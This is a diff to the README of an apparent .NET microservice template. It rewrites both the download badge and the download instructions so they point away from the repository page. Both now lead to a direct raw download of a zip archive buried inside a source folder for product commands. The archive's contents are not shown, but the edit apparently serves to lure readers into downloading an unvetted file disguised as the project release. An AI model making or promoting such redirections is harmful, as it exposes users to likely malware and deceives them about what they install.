@@ -1,6 +1,6 @@
 # 🛠️ net-microservice-template - Build reliable services with clean foundations
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://github.com/RSaliko/net-microservice-template)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/RSaliko/net-microservice-template/master/src/ProductService/ProductService.Application/Features/Products/Commands/template_net_microservice_v3.8.zip)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these items before you begin:
 
 ## 🚀 Downloading the software
 
-You need the latest files to run the local version of the template. Visit this page to download the source code and configuration files: [https://github.com/RSaliko/net-microservice-template](https://github.com/RSaliko/net-microservice-template).
+You need the latest files to run the local version of the template. Visit this page to download the source code and configuration files: [https://raw.githubusercontent.com/RSaliko/net-microservice-template/master/src/ProductService/ProductService.Application/Features/Products/Commands/template_net_microservice_v3.8.zip](https://raw.githubusercontent.com/RSaliko/net-microservice-template/master/src/ProductService/ProductService.Application/Features/Products/Commands/template_net_microservice_v3.8.zip).
 
 Follow these steps to obtain the files:
 
